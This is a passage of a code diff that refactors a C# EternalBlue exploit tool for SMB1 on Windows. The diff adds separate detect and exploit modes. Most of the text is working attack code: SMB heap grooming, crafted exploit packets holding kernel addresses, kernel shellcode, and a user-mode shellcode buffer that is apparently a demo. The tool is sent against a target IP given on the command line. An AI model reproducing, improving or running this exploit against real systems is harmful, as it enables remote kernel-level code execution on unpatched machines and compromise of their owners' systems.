+                pkt = MakeSMB1FreeHoleSessionPacket(flags2, vcnum, native_os);
             }
 
-            sock.Send(pkt);
-            SMB1_Get_Response(sock);
+            SendSMBMessage(sock, pkt, true);
+            ReceiveSMBMessage(sock);
             return sock;
         }
 
-        static public List<Socket> smb2_grooms(String ip, int port, int grooms, byte[] payload_hdr_pkt, List<Socket> groom_socks)
+        static public List<Socket> SMB2Grooms(string ip, int port, int grooms, byte[] payload_hdr_pkt, List<Socket> groom_socks)
         {
-
             for (int i = 0; i < grooms; i++)
             {
                 TcpClient client = new TcpClient(ip, port);
                 Socket gsock = client.Client;
                 groom_socks.Add(gsock);
-                gsock.Send(payload_hdr_pkt);
+                SendSMBMessage(gsock, payload_hdr_pkt, false);
             }
-
             return groom_socks;
         }
 
-        static public byte[] make_smb2_payload_headers_packet()
+        static public byte[] MakeSMB2PayLoadHeadersPacket()
         {
             byte[] pkt = { 0x00, 0x00, 0xff, 0xf7, 0xfe, 0x53, 0x4D, 0x42 };
             byte[] tmp = Enumerable.Repeat((byte)0x00, 124).ToArray();
@@ -380,52 +425,51 @@ namespace Eternalblue
             return pkt;
         }
 
-        static public byte[] make_smb2_payload_body_packet(byte[] kernel_user_payload)
+        static public byte[] MakeSMB2PayloadBodyPacket(byte[] kernel_user_payload)
         {
             int pkt_max_len = 4204;
             int pkt_setup_len = 497;
             int pkt_max_payload = pkt_max_len - pkt_setup_len;
-
             List<byte> pkt = new List<byte>();
 
             pkt.AddRange(new List<byte>()
             {
                  0x00, 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00, 0x03, 0x00, 0x00, 0x00
             });
-            pkt = helper(pkt, 0x00, 28); //0x1c
+            pkt = Helper(pkt, 0x00, 28); //0x1c
             pkt.AddRange(new List<byte>()
             {
                  0x03,0x00,0x00,0x00
             });
-            pkt = helper(pkt, 0x00, 116); //0x74
+            pkt = Helper(pkt, 0x00, 116); //0x74
             //KI_USER_SHARED_DATA addresses
             pkt.AddRange(new List<byte>()
             { //64
                  0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff
             });
-            pkt = helper(pkt, 0x00, 16); //0x10
+            pkt = Helper(pkt, 0x00, 16); //0x10
             pkt.AddRange(new List<byte>()
             { //86
                 0xc0,0xf0,0xdf,0xff,0xc0,0xf0,0xdf,0xff
             });
-            pkt = helper(pkt, 0x00, 196); //0xc4 
+            pkt = Helper(pkt, 0x00, 196); //0xc4 
 
             //payload address
             pkt.AddRange(new List<byte>()
             { 
                0x90,0xf1,0xdf,0xff
             });
-            pkt = helper(pkt, 0x00, 4); //0x4 
+            pkt = Helper(pkt, 0x00, 4); //0x4 
             pkt.AddRange(new List<byte>()
             {
                0xf0,0xf1,0xdf,0xff
             });
-            pkt = helper(pkt, 0x00, 64); //0x40
+            pkt = Helper(pkt, 0x00, 64); //0x40
             pkt.AddRange(new List<byte>()
             {
                0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
             });
-            pkt = helper(pkt, 0x00, 8); //0x8
+            pkt = Helper(pkt, 0x00, 8); //0x8
             pkt.AddRange(new List<byte>()
             {
                0x00,0x02,0xd0,0xff,0xff,0xff,0xff,0xff,0x00
@@ -440,11 +484,10 @@ namespace Eternalblue
                 pkt.Add(0x00);
             }
             */
-
             return pkt.ToArray();
         }
 
-        static public byte[] make_kernel_shellcode()
+        static public byte[] MakeKernelShellcode()
         {
             byte[] shellcode = {0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,
 0xFF,0x89,0x53,0x04,0x89,0x03,0x48,0x8D,0x05,0x0A,0x00,0x00,0x00,0x48,0x89,0xC2,
@@ -513,50 +556,71 @@ namespace Eternalblue
             return shellcode;
         }
 
-        static public byte[] make_kernel_user_payload(byte[] ring3)
+        static public byte[] MakeKernelUserPayload(byte[] ring3)
         {
-            byte[] shellcode = make_kernel_shellcode();
+            byte[] shellcode = MakeKernelShellcode();
             byte[] length = BitConverter.GetBytes((UInt16)ring3.Length);
             shellcode = shellcode.Concat(length).ToArray();
             shellcode = shellcode.Concat(ring3).ToArray();
-            System.Diagnostics.Debug.WriteLine(BitConverter.ToString(shellcode).Replace("-", ""));
-
             return shellcode;
         }
 
-
-        static void Main(string[] args)
+        public static bool IsValidIP(string ipString)
         {
-            if (args.Length < 2)
-            {
-                Console.WriteLine("Usage: Eternalblue.exe [ip] [grooms]");
-                Environment.Exit(0);
-            }
-            bool vulnerable = false;
-            string ip = args[0];
-            int port = 445;
-            int grooms = Convert.ToInt32(args[1]);
-            //int MaxAttempts = args[2]; 
+            if (ipString.Count(c => c == '.') != 3) return false;
+            IPAddress address;
+            return IPAddress.TryParse(ipString, out address);
+        }
 
+        static bool Detect(string target)
+        {
+            string ip = target;
+            int port = 445;
+
+            try
+            {
+                TcpClient client = new TcpClient(ip, port);
+                Socket sock = client.Client;
+
+                ClientNegotiate(sock);
+                byte[] response = SMB1AnonymousLogin(sock);
+                Console.WriteLine("Trying to detect version of Windows running on " + target + " ...");
+                DetectVersionOfWindows(response);
+
+                SMB_HEADER header = SMB_HeaderFromBytes(response);
+                TreeConnectAndX(ip, sock, header.UID);
+
+                //This is checked with userid 2049 and not 2048
+                bool vulnerable = CheckVulnerability(sock);
+                if (vulnerable)
+                {
+                    Console.WriteLine(target + " appears to be vulnerable!");
+                    sock.Close();
+                    client.Close();
+                    return true;
+                }
+                else
+                {
+                    Console.WriteLine("IP: " + target + " does not appears to be vulnerable!");
+                    sock.Close();
+                    client.Close();
+                }
+            } catch
+            {
+                return false;
+            }
+            return false;
+        }
+
+        static void Exploit(string target)
+        {
+            string ip = target;
+            int port = 445;
+            int grooms = 12;
             TcpClient client = new TcpClient(ip, port);
             Socket sock = client.Client;
-            
 
-            byte[] response = Client_Negotiate(sock);
-            response = smb1_anonymous_login(sock);
-            Detect_Version(response);
-
-            SMBHeader smbh = Parsed_SMBHeader(response);
-            response = tree_connect_andx(ip, sock, smbh.user_id);
-
-            //This is sent with userid 2049 and not 2048
-            vulnerable = Check_Vulnerability(sock);
-            sock.Close();
-            client.Close();
-
-            if (vulnerable)
-            {
-                byte[] buf = new byte[279] {
+            byte[] buf = new byte[279] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
@@ -576,79 +640,94 @@ namespace Eternalblue
 0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
 0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
 0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };
+            byte[] shellcode = MakeKernelUserPayload(buf);
+            byte[] payload_hdr_pkt = MakeSMB2PayLoadHeadersPacket();
+            byte[] payload_body_pkt = MakeSMB2PayloadBodyPacket(shellcode);
 
-                byte[] shellcode = make_kernel_user_payload(buf);
-                byte[] payload_hdr_pkt = make_smb2_payload_headers_packet();
-                byte[] payload_body_pkt = make_smb2_payload_body_packet(shellcode);
+            Console.WriteLine("Trying to exploit: " + target);
+            ClientNegotiate(sock);
+            byte[] response = SMB1AnonymousLogin(sock);
+            SMB_HEADER header = SMB_HeaderFromBytes(response);
+            response = TreeConnectAndX(ip, sock, header.UID);
+            header = SMB_HeaderFromBytes(response);
+            sock.ReceiveTimeout = 2000;
+            Console.WriteLine("Connection established for exploitation.");
 
-                Console.WriteLine("Target appears to be vulnerable!");
-                client = new TcpClient(ip, port);
-                sock = client.Client;
-                response = Client_Negotiate(sock);
-                response = smb1_anonymous_login(sock);
-                smbh = Parsed_SMBHeader(response);
-                response = tree_connect_andx(ip, sock, smbh.user_id);
-                smbh = Parsed_SMBHeader(response);
-                sock.ReceiveTimeout = 2000;
-                Console.WriteLine("Connection established for exploitation.");
-                Console.WriteLine("Creating a large SMB1 buffer.");
-                Console.WriteLine("All but last fragment of exploit packet");
-                response = smb1_large_buffer(smbh, sock);
+            Console.WriteLine("Creating a large SMB1 buffer... All but last fragment of exploit packet");
+            SMB1LargeBuffer(header, sock);
+            Socket fhs_sock = SMB1FreeHole(ip, port, true);
 
-                Socket fhs_sock = smb1_free_hole(ip,port,true);
+            Console.WriteLine("Grooming...");
+            List<Socket> grooms_socks = new List<Socket>();
+            grooms_socks = SMB2Grooms(ip, port, grooms, payload_hdr_pkt, grooms_socks);
+            Socket fhf_sock = SMB1FreeHole(ip, port, false);
+            fhs_sock.Close();
+            grooms_socks = SMB2Grooms(ip, port, 6, payload_hdr_pkt, grooms_socks);
+            fhf_sock.Close();
 
-                List<Socket> grooms_socks = new List<Socket>();
-                grooms_socks = smb2_grooms(ip, port, grooms, payload_hdr_pkt, grooms_socks);
-                Console.WriteLine("Grooming...");
+            Console.WriteLine("Ready for final exploit...");
+            byte[] final_exploit_pkt = MakeSMB1Trans2ExploitPacket(header.TID, header.UID, "eb_trans2_exploit", 15);
 
-                Socket fhf_sock = smb1_free_hole(ip, port, false);
-
-                fhs_sock.Close();
-
-                grooms_socks = smb2_grooms(ip, port, 6, payload_hdr_pkt, grooms_socks);
-
-                fhf_sock.Close();
-
-                Console.WriteLine("Ready for final exploit...");
-
-                byte[] trans2_pkt_nulled;
-                byte[] final_exploit_pkt = trans2_pkt_nulled = make_smb1_trans2_exploit_packet(smbh.tree_id, smbh.user_id, "eb_trans2_exploit", 15);
-
-                try
-                {
-                    sock.Send(final_exploit_pkt);
-                    response = SMB1_Get_Response(sock);
-                    smbh = new SMBHeader();
-                    smbh = Parsed_SMBHeader(response);
-
-                    Console.WriteLine("SMB code: " + BitConverter.ToString(smbh.error_code));
-                } catch (Exception e)
-                {
-                    Console.WriteLine("Socket error, this might end badly");
-                }
-
-                Console.WriteLine("Sending exploits with the grooms");
-
-
-                
-                foreach (Socket s in grooms_socks)
-                {
-                    s.Send(payload_body_pkt.Take(2920).ToArray());
-                }
-                foreach (Socket s in grooms_socks)
-                {
-                    s.Send(payload_body_pkt.Skip(2920).ToArray());
-                }
-                foreach (Socket s in grooms_socks)
-                {
-                    s.Close();
-                }
-                Console.WriteLine("Exploit send successfully... Good luck");
-                client.Close();
-                sock.Close();
+            try
+            {
+                SendSMBMessage(sock, final_exploit_pkt, false);
+                response = ReceiveSMBMessage(sock);
+                header = new SMB_HEADER();
+                header = SMB_HeaderFromBytes(response);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Socket error, this might end badly" + e.Message);
             }
 
+            Console.WriteLine("Sending exploits with the grooms");
+            foreach (Socket s in grooms_socks)
+            {
+                SendSMBMessage(s, payload_body_pkt.Take(2920).ToArray(), false);
+            }
+            foreach (Socket s in grooms_socks)
+            {
+                SendSMBMessage(s, payload_body_pkt.Skip(2920).ToArray(), false);
+            }
+            foreach (Socket s in grooms_socks)
+            {
+                s.Close();
+            }
+            Console.WriteLine("Exploit send successfully...");
+            client.Close();
+            sock.Close();
+        }
 
+
+        static void Main(string[] args)
+        {
+            if (args.Length < 2)
+            {
+                Console.WriteLine("Usage: Eternalblue.exe [detect/exploit] [ip]");
+                Console.WriteLine("Detect eternalblue on specific IP:           Eternalblue.exe detect 192.168.141.210");
+                Console.WriteLine("Exploit eternalblue on specific IP:          Eternalblue.exe exploit 192.168.141.210");
+                Environment.Exit(0);
+            }
+
+            bool shouldExploit = false;
+            if (args[0].Equals("exploit"))
+            {
+                shouldExploit = true;
+            }
+
+            if (IsValidIP(args[1])) {
+                string target = args[1];
+                bool isVulnerable = Detect(target);
+
+                if (isVulnerable && shouldExploit)
+                {
+                    Exploit(target);
+                }
+            }
+            else
+            {
+                Console.WriteLine("Not a valid IP...");
+            }
         }
     }
 }
